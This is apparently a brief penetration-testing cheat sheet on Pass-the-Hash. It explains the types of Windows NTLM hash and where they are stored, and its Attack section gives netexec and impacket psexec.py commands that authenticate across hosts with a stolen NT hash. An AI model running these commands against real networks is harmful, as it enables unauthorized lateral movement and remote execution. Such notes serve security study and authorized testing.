# Pass the Hash

## Brief

* **NTLM** (aka NT) hashes are **local users hashes.**
* **NTMLv1/v2** (aka Net-NTLMv1/v2) hashes are used for **network authentication**.
* **MSCASHv1/v2** (aka DCCv1/v2) are **domain users hashes**.

> You **can** perform Pass-the-Hash on **NTLM** hashes. You **cannot** perform Pass-the-Hash on **Net-NTLM** hashes.

NTLM hashes are stored in the **Security Account Manager** (SAM) database and in Domain Controller's **NTDS.dit** database.

## Attack

```bash
nxc $ip_range/$CIDR -u $user -H $hash(only NT part) --local

psexec.py $user:@$ip_addr -hashes $hash
```
